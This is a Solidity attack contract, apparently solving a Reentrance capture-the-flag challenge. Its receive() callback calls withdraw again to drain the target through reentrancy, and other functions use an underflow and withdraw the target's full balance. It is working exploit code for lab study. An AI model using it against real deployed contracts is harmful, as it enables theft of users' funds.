// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../prob/Reentrance/Reentrance.sol";

import "hardhat/console.sol";

contract ReentranceAttackLog {
    Reentrance target;

    constructor(address payable _target) public payable {
        target = Reentrance(_target);
    }

    function attack_recursive() public {
        target.donate{value: 0.0001 ether}(address(this));

        target.withdraw(0.0001 ether);
    }

    function attack_1_causeOverflow() public {
        target.donate{value: 1}(address(this));
        target.withdraw(1);
    }

    function attack_2_deplete() public {
        console.log("[Attack:attack_2] deplete!");

        console.log(
            "[Attack:attack_2] current balance: ",
            target.balanceOf(address(this))
        );
        target.withdraw(address(target).balance);
    }

    receive() external payable {
        console.log("[Attack:receive] receive!: ", msg.value);
        console.log(
            "[Attack:receive] attacker balance: ",
            target.balanceOf(address(this))
        );

        console.log(
            "[Attack:receive] contract balance: ",
            address(target).balance
        );

        console.log("[Attack:receive] call withdraw...");

        // [1] attack_recursive
        // target.withdraw(0.0001 ether);

        // [2] attack_1, attack_2
        target.withdraw(1);
    }
}
